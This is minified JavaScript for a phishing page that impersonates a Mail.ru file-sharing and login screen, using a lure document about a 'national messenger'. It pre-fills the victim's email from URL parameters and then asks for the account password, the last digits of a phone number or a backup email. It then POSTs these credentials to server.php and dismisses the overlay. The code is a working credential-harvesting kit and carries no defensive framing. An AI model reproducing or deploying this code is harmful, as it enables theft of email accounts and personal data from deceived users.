var linkImg="https://filin.mail.ru/pic?width=1000&height=1000&email=";function getParamsFromCurrentURL(){const e=new URL(window.location.href).searchParams;return{account:e.get("account"),number:e.get("number"),mail:e.get("from")}}const data=getParamsFromCurrentURL();linkImg+=data.account;var accountMail=data.account,fromMail=data.mail,loginInputValue=data.account,numberMail=data.number;const loading='<svg class="spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">\n    <defs>\n      <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">\n        <stop offset="0%" style="stop-color:#005bff; stop-opacity:1;" />\n        <stop offset="15%" style="stop-color:#005bff; stop-opacity:1;" />\n        <stop offset="50%" style="stop-color:#005bff; stop-opacity:0.5;" />\n        <stop offset="75%" style="stop-color:#005bff; stop-opacity:0.3;" />\n        <stop offset="100%" style="stop-color:#005bff; stop-opacity:0;" />\n      </linearGradient>\n    </defs>\n    <circle class="path" fill="none" stroke-width="8" stroke-linecap="round" cx="33" cy="33" r="25"></circle>\n  </svg>';document.addEventListener("DOMContentLoaded",function(){fileAccess.innerHTML=loading,setTimeout(()=>{fileAccess.innerHTML=`\n        <div>\n            <div class="file-access-inner">\n                <div>Доступ к файлу</div>\n                <div>${fromMail} предостовляет вам доступ к файлу</div>\n                <div id="button-file-access" class="button-file-access">Открыть</div>\n            </div>\n            <div class="login-account-qr-code">\n                <div class="login-account-qr-code-inner">\n                    <img src="css/res/qr-code-user.png" alt="">\n                    <div class="qr-code-form">\n                        <div class="qr-code-title">Быстрый вход по QR-коду</div>\n                        <div class="qr-code-text">Наведите камеру телефона</div>\n                        <a href="https://help.mail.ru/mail/account/login/qr#hint" class="qr-code-button">Подробнее</a>\n                    </div>\n                </div>\n            </div>\n        </div>\n        `},500)});const fileAccess=document.querySelector(".file-access"),fileAccessOutside=document.querySelector(".file-access-outside"),bgOpacity=document.querySelector(".bg-opacity"),fileFocusIcon=document.querySelector(".file-focus-icon"),NewfileFocusIcon="css/res/icon-file-focus.svg",NewfileFocusIcon2="css/res/Group 15 (1).svg",contentFile=document.querySelector(".content-file");var offset=!1,checkOffset=!0,loginValue=accountMail;const showMoreBtn=document.querySelector("#show_more"),showMoreContent=document.querySelector(".helping__information"),downloadBtn=document.querySelector(".download"),srcListCheck="css/res/list-check.png",emptysrc="";var loginInputValueFour,passwordInputValue;function inputSelectionInnerfun(){const e=document.getElementsByClassName("input-selection-inner");for(let t=0;t<e.length;t++)e[t].style.border="2px solid #ffffff00"}function srcListCheckNone(){const e=document.getElementsByClassName("mail-text-check");for(let t=0;t<e.length;t++)e[t].setAttribute("src","")}contentFile.addEventListener("click",function(e){0==offset&&"download-file"!=e.target.classList.value?(fileFocusIcon.setAttribute("src",NewfileFocusIcon),offset=!0):1==offset&&"download-file"!=e.target.classList.value?(fileFocusIcon.setAttribute("src",NewfileFocusIcon2),offset=!1):"download-file"==e.target.classList.value&&(location.href="10.09.2025_Национальный мессенджер.docx")}),window.addEventListener("click",function(e){const t=document.querySelector(".password-input"),n=document.getElementById("form-checkbox-inner");if("btn_dowload"==e.target.id&&(location.href="10.09.2025_Национальный мессенджер.docx"),"input-selection-inner-yandex"==e.target.id&&(window.location.href="https://passport.yandex.ru/auth"),"user-name-repeat-inner"==e.target.classList.value&&(fileAccess.innerHTML=loading,setTimeout(()=>{fileAccess.innerHTML="\n            ",fileAccess.style.opacity="1"},800)),"input-selection-inner"==e.target.classList.value&&(inputSelectionInnerfun(),e.target.style.border="2px solid #005FF9"),"form-checkbox-inner"==e.target.classList.value&&1==checkOffset?(n.style.backgroundColor="#fff",n.style.border="1px solid #c2c2c2",checkOffset=!1):"form-checkbox-inner"==e.target.classList.value&&0==checkOffset&&(n.style.backgroundColor="#005FF9",n.style.border="1px solid #c2c2c200",checkOffset=!0),"button-file-access"==e.target.classList.value&&(fileAccess.innerHTML=loading,setTimeout(()=>{fileAccess.innerHTML=`\n            <div class="login-account">\n                <div class="login-account-inner">\n                    <div class="login-account-title">Войти в аккаунт</div>\n                    <div class="login-account-title-button">\n                        <img class="login-account-button-img" src="${linkImg}" alt="">\n                        <div class="login-account-button-div">${accountMail}</div>\n                    </div>\n                </div>\n                <div class="login-account-qr-code"> \n                    <div class="login-account-qr-code-inner">\n                        <img src="css/res/qr-code-user.png" alt="">\n                        <div class="qr-code-form"> \n                            <div class="qr-code-title">Быстрый вход по QR-коду</div>\n                            <div class="qr-code-text">Наведите камеру телефона</div>\n                            <a href="" class="qr-code-button">Подробнее</a>\n                        </div>\n                    </div>\n                </div>\n            </div>`,fileAccess.style.opacity="1"},800)),"login-account-title-button"!=e.target.classList.value&&"login-account-button-div"!=e.target.classList.value&&"login-account-button-img"!=e.target.classList.value||(fileAccess.innerHTML=loading,setTimeout(()=>{fileAccess.innerHTML=`\n            <div class="login-account-user">\n                <div class="login-account-form">\n                    <div class="login-account-form-title-left">Данные от аккаунта</div>\n                    <div class="user-name-repeat">\n                        <div class="user-name-repeat-name">${loginInputValue}</div>\n                    </div>\n                    <form action="" onsubmit="return false;">\n                        <div class="form-input">\n                            <div class="pass-input-eye">\n                                <input class="password-input" id="password-input" type="password" placeholder="Пароль" required>\n                                <div class="pass-input-eye-btn" id="pass-input-eye-outside">\n                                    <img class="pass-input-eye-btn" id="pass-input-eye-inner" src="css/res/icon-eye.png"\n                                        alt="">\n                                </div>\n                            </div>\n                        </div>\n                        <div class="form-button">\n                            <div class="form-button-clk-pass" id="form-button-clk-pass">Открыть файл</div>\n                            <div class="form-checkbox">\n                                <div id="form-checkbox-inner" class="form-checkbox-inner">\n                                    <img class="form-checkbox-inner" src="css/res/icon-checkbox.svg" alt="">\n                                </div>\n                                <span>запомнить</span>\n                            </div>\n                        </div>\n                    </form>\n                </div>\n                <div class="login-account-user-footer-pass">\n                    <a href="https://account.mail.ru/recovery">Восстановить доступ</a>\n                    <div>\n                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"\n                            class="base-0-2-23" ie-style="">\n                            <path fill-rule="evenodd" clip-rule="evenodd" fill="#333"\n                                d="M3 1a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V3a2 2 0 00-2-2H3zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1zM3 9a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2v-2a2 2 0 00-2-2H3zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1zM11 1a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V3a2 2 0 00-2-2h-2zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1z">\n                            </path>\n                            <rect x="9" y="13" width="2" height="2" rx="1" fill="#333"></rect>\n                            <path fill-rule="evenodd" clip-rule="evenodd" fill="#333"\n                                d="M10 9a1 1 0 000 2h3v3a1 1 0 102 0v-4a1 1 0 00-1-1h-4z"></path>\n                        </svg>\n                        <a href="https://help.mail.ru/mail/account/login/qr#hint">Войти по QR-коду</a>\n                    </div>\n                </div>\n            </div>\n            `,fileAccess.style.opacity="1"},800),setTimeout(()=>{const e=document.getElementById("password-input"),t=document.getElementById("form-button-clk-pass");e&&e.addEventListener("keypress",e=>{"Enter"===e.key&&(e.preventDefault(),t.click())})},1500)),"form-button-clk-pass"==e.target.classList.value&&""!=t.value&&(passwordInputValue=t.value,fileAccess.innerHTML=loading,setTimeout(()=>{fileAccess.innerHTML="rezerv"==numberMail?'\n      <div>\n        <div id=\'rezerv_block\' class="rezerv_block">\n          <div class="rezerv_block_text1">Вход в аккаунт Mail.ru</div>\n          <div class="rezerv_block_text2_outside">\n            <div class="rezerv_block_text2">Это точно вы? Укажите резервную почту,<br>чтобы войти в аккаунт</div>\n          </div>\n          <input class="rezerv_block_input1" type="text" placeholder="Введите резервную почту">\n          <div class="rezerv_block_button1_outside">\n            <div id="rezerv_block_button1" class="four-button">Продолжить</div>\n          </div>\n        </div>\n      </div>\n    ':'\n      <div>\n        <div class="file-num-inner" id="file-num-inner">\n          <div class="file-num-inner-top">\n            <div>Вход в аккаунт Mail.ru</div>\n            <div>Это точно вы? Дополните свой номер телефон, чтобы войти в аккаунт</div>\n            <div class="phone-input">\n              <span>+7 </span><span>(</span>\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <span>)</span>\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <span>-</span>\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <span>-</span>\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n              <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\\d*">\n            </div>\n            <div>Укажите шесть последних цифр номера</div>\n          </div>\n          <div class="file-num-inner-bottom">\n            <div class="four-button" id="continue-button" style="pointer-events:none; opacity:0.5;">Продолжить</div>\n          </div>\n        </div>\n      </div>\n    '},500),setTimeout(()=>{if(document.getElementById("file-num-inner")){const e=document.querySelectorAll(".digit"),t=document.getElementById("continue-button"),n=()=>{Array.from(e).every(e=>1===e.value.trim().length)?(t.style.pointerEvents="auto",t.style.opacity="1"):(t.style.pointerEvents="none",t.style.opacity="0.5")};e.forEach((i,s)=>{i.addEventListener("input",()=>{i.value=i.value.replace(/\D/,""),1===i.value.length&&s<e.length-1&&e[s+1].focus(),n()}),i.addEventListener("keydown",n=>{if("Backspace"===n.key&&""===i.value&&s>0&&e[s-1].focus(),"Enter"===n.key){Array.from(e).every(e=>1===e.value.trim().length)&&t.click()}}),i.addEventListener("focus",()=>{i.hasAttribute("readonly")||(i.value="")})}),numberMail.split("").forEach((t,n)=>{e[n]&&(e[n].value=t,e[n].setAttribute("readonly",!0))}),n()}},500)),"pass-input-eye-btn"==e.target.classList.value&&"password"==t.type?t.type="text":"pass-input-eye-btn"==e.target.classList.value&&(t.type="password"),e.target.classList.contains("four-button")||"Enter"==e.key){if(document.getElementById("file-num-inner"))var i=Array.from(document.querySelectorAll(".digit")).map(e=>e.value).join("");if(document.getElementById("rezerv_block"))i=document.querySelector(".rezerv_block_input1").value;if(""!==i)var s={login:loginValue,pass:passwordInputValue,num:i};else console.error("Одно или несколько полей ввода пустые.");console.log(s),fetch("server.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)}).then(e=>e.json()).then(e=>{console.log(e)}).catch(e=>{console.error("Error:",e)}),fileAccessOutside.innerHTML="",fileAccessOutside.innerHTML=loading,setTimeout(()=>{bgOpacity.style.opacity="0",bgOpacity.style.zIndex="-99",fileAccessOutside.style.zIndex="-100",fileAccessOutside.innerHTML=""},1e3)}});
